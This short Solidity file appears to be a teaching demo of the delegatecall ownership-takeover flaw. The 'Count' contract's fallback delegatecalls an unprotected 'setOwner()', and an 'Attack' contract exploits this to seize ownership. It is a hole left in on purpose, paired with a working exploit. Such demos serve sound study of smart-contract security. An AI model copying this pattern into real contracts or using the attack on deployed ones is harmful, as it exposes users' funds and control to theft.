// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

contract User {
    address public owner;

    function setOwner() public {
        owner = msg.sender;
    }
}

contract Count {
    address public owner;
    User public user;

    constructor(User _user) {
        owner = msg.sender;
        user = User(_user);
    }

    fallback() external payable {
        address(user).delegatecall(msg.data);
    }
}

contract Attack {
    address public countAddress;

    constructor (address _countAddress) {
        countAddress = _countAddress;
    }

    function attack() public {
        address(countAddress).call(abi.encodeWithSignature("setOwner()"));
    }
}
